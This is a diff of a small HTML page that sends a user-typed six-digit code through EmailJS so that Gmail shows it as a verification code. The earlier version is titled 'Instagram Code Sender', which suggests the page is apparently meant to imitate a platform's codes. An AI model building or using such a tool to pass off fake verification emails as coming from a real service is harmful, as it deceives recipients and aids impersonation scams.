@@ -3,56 +3,68 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Send Code</title>
+<title>OTP Verify</title>
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <style>
-body{font-family:Arial;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+body{font-family:Arial;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
 .box{background:#fff;padding:25px;border-radius:12px;width:90%;max-width:350px;box-shadow:0 4px 10px rgba(0,0,0,0.1)}
-input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:8px;font-size:18px;text-align:center;letter-spacing:5px;box-sizing:border-box}
-button{width:100%;padding:12px;background:#000;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer}
-button:active{opacity:0.8}
+input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:8px;font-size:16px;box-sizing:border-box;text-align:center}
+button{width:100%;padding:12px;background:#000;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:10px}
+.page2{display:none}
 </style>
 </head>
 <body>
-<div class="box">
-<h3 style="text-align:center;margin:0 0 15px 0">Instagram Code Sender</h3>
-<input type="text" id="codeInput" placeholder="160443" maxlength="6">
+
+<div class="box" id="page1">
+<h3 style="text-align:center">OTP Verify</h3>
+<input type="email" id="userEmail" placeholder="example@gmail.com">
+<button onclick="goToPage2()">Next</button>
+</div>
+
+<div class="box page2" id="page2">
+<h3 style="text-align:center">Enter Code</h3>
+<p style="text-align:center;font-size:12px;color:#666" id="showEmail"></p>
+<input type="text" id="codeInput" placeholder="123456" maxlength="6">
 <button onclick="sendCode()" id="btn">Send Code</button>
 <p id="msg" style="text-align:center;font-size:13px;margin-top:10px"></p>
+<button onclick="back()" style="background:#eee;color:#000">Back</button>
 </div>
 
 <script>
-// ===== YAHAN APNI KEYS DALO =====
-const SERVICE_ID = "service_xxxx"; // Email Services se copy karo
-const TEMPLATE_ID = "template_2r1r6ii"; // Ye sahi hai, change mat karna
-const PUBLIC_KEY = "your_public_key_here"; // Account > Public Key se copy karo
-// =================================
+const SERVICE_ID = "service_m2y2j8e";
+const TEMPLATE_ID = "template_2r1r6ii";
+const PUBLIC_KEY = "M1gpuw8FX2OfMZz2";
 
 emailjs.init(PUBLIC_KEY);
 
+function goToPage2(){
+  let email = document.getElementById("userEmail").value;
+  if(!email){ alert("Email likho"); return; }
+  document.getElementById("page1").style.display="none";
+  document.getElementById("page2").style.display="block";
+  document.getElementById("showEmail").innerText = email;
+}
+function back(){
+  document.getElementById("page2").style.display="none";
+  document.getElementById("page1").style.display="block";
+}
 function sendCode(){
   let code = document.getElementById("codeInput").value.trim();
   let btn = document.getElementById("btn");
   let msg = document.getElementById("msg");
-  
-  if(code.length < 4){ alert("Code likho!"); return; }
-  
-  btn.innerText = "Sending...";
-  btn.disabled = true;
-
+  if(code.length < 4){ alert("Code likho"); return; }
+  btn.innerText="Sending..."; btn.disabled=true;
   emailjs.send(SERVICE_ID, TEMPLATE_ID, {
     transaction_code: code,
     amount: "USD 0.00"
-  }).then(() => {
-    msg.innerText = "✓ Sent! Gmail app me check karo - upar Code box ayega";
-    msg.style.color = "green";
-    btn.innerText = "Send Code";
-    btn.disabled = false;
-  }).catch((err) => {
-    msg.innerText = "Error: " + JSON.stringify(err);
-    msg.style.color = "red";
-    btn.innerText = "Send Code";
-    btn.disabled = false;
+  }).then(()=>{
+    msg.innerText="✓ Sent! Gmail app check karo";
+    msg.style.color="green";
+    btn.innerText="Send Code"; btn.disabled=false;
+  }).catch((e)=>{
+    msg.innerText="Error: "+JSON.stringify(e);
+    msg.style.color="red";
+    btn.innerText="Send Code"; btn.disabled=false;
   });
 }
 </script>
